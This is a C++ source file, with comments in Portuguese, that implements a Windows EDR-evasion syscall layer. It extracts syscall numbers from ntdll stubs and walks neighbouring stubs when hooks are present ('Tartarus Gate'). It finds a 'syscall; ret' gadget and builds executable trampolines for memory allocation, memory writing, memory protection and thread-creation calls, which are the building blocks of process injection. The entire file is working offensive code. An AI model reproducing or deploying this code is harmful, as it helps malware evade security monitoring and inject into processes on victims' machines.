#include "syscalls.h"
#include <cstring>

namespace {

HMODULE  g_ntdll   = nullptr;
void*    g_gadget  = nullptr;   // "syscall; ret" dentro de ntdll
unsigned g_stubs   = 0;
SysApi   g_api;

// --- leitura de stubs -------------------------------------------------------

// Padroes de prologo de stub limpo:
//   4C 8B D1 B8 <ssn>          (mov r10, rcx ; mov eax, ssn)
//   B8 <ssn>                   (mov eax, ssn)
bool ExtractSSN(const BYTE* p, DWORD& ssn)
{
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {
        ssn = *reinterpret_cast<const DWORD*>(p + 4);
        return ssn < 0x2000;
    }
    if (p[0] == 0xB8) {
        DWORD v = *reinterpret_cast<const DWORD*>(p + 1);
        if (v < 0x2000) { ssn = v; return true; }
    }
    return false;
}

// Tartarus Gate: se o stub esta hookado (jmp/cmp no inicio), anda pelos
// vizinhos ate achar um stub intacto. Stubs do ntdll sao alinhados em 0x20.
DWORD ResolveSSN(const char* name)
{
    const BYTE* fn = reinterpret_cast<const BYTE*>(GetProcAddress(g_ntdll, name));
    if (!fn) return 0;

    DWORD ssn = 0;
    if (ExtractSSN(fn, ssn)) return ssn;

    for (DWORD off = 0x20; off <= 0x400; off += 0x20) {
        if (ExtractSSN(fn - off, ssn)) return ssn;
        if (ExtractSSN(fn + off, ssn)) return ssn;
    }
    return 0;
}

// --- localizacao do gadget --------------------------------------------------

void* FindSyscallGadget()
{
    auto* base = reinterpret_cast<BYTE*>(g_ntdll);
    auto* dos  = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    auto* nt   = reinterpret_cast<IMAGE_NT_HEADERS64*>(base + dos->e_lfanew);

    auto* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (memcmp(sec[i].Name, ".text", 5) != 0) continue;
        BYTE* p   = base + sec[i].VirtualAddress;
        BYTE* end = p + sec[i].Misc.VirtualSize - 3;
        for (; p < end; ++p) {
            if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3)  // syscall ; ret
                return p;
        }
    }
    return nullptr;
}

// --- construcao do stub -----------------------------------------------------

void* MakeStub(DWORD ssn, void* gadget)
{
    BYTE* mem = static_cast<BYTE*>(
        VirtualAlloc(nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (!mem) return nullptr;

    // 4C 8B D1          mov  r10, rcx        (arg1 do syscall fica em r10)
    // B8 <ssn>          mov  eax, <ssn>      (EAX carrega o numero do servico)
    // FF 25 00000000    jmp  qword [rip+0]   (salto sem tocar em registrador)
    // <gadget 8 bytes>                       (endereco do `syscall; ret`)
    //
    // Nao usar `mov rax, gadget; jmp rax`: isso destruiria o SSN em EAX e o
    // syscall iria para o servico errado (bug observado: NtQueryInformationProcess
    // retornando falha). r11 tambem nao serve de forma generica, mas o salto
    // indireto por memoria evita qualquer registrador.
    BYTE code[32];
    SIZE_T n = 0;
    code[n++] = 0x4C; code[n++] = 0x8B; code[n++] = 0xD1;
    code[n++] = 0xB8;
    memcpy(code + n, &ssn, 4); n += 4;
    code[n++] = 0xFF; code[n++] = 0x25;
    DWORD zero = 0;
    memcpy(code + n, &zero, 4); n += 4;
    memcpy(code + n, &gadget, 8); n += 8;

    memcpy(mem, code, n);

    DWORD old = 0;
    if (!VirtualProtect(mem, 0x1000, PAGE_EXECUTE_READ, &old)) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return nullptr;
    }
    ++g_stubs;
    return mem;
}

template <typename T>
bool Bind(T& slot, const char* name)
{
    DWORD ssn = ResolveSSN(name);
    if (!ssn) return false;
    void* stub = MakeStub(ssn, g_gadget);
    if (!stub) return false;
    slot = reinterpret_cast<T>(stub);
    return true;
}

} // namespace

bool SysInit()
{
    if (g_api.NtClose) return true;   // idempotente

    g_ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!g_ntdll) return false;

    g_gadget = FindSyscallGadget();
    if (!g_gadget) return false;

    bool ok = true;
    ok &= Bind(g_api.NtAllocateVirtualMemory,   "NtAllocateVirtualMemory");
    ok &= Bind(g_api.NtProtectVirtualMemory,    "NtProtectVirtualMemory");
    ok &= Bind(g_api.NtWriteVirtualMemory,      "NtWriteVirtualMemory");
    ok &= Bind(g_api.NtReadVirtualMemory,       "NtReadVirtualMemory");
    ok &= Bind(g_api.NtQueryInformationProcess, "NtQueryInformationProcess");
    ok &= Bind(g_api.NtCreateThreadEx,          "NtCreateThreadEx");
    ok &= Bind(g_api.NtClose,                   "NtClose");
    return ok;
}

const SysApi& Sys() { return g_api; }

void SysStats(unsigned* stubs, void** gadget)
{
    if (stubs)  *stubs  = g_stubs;
    if (gadget) *gadget = g_gadget;
}
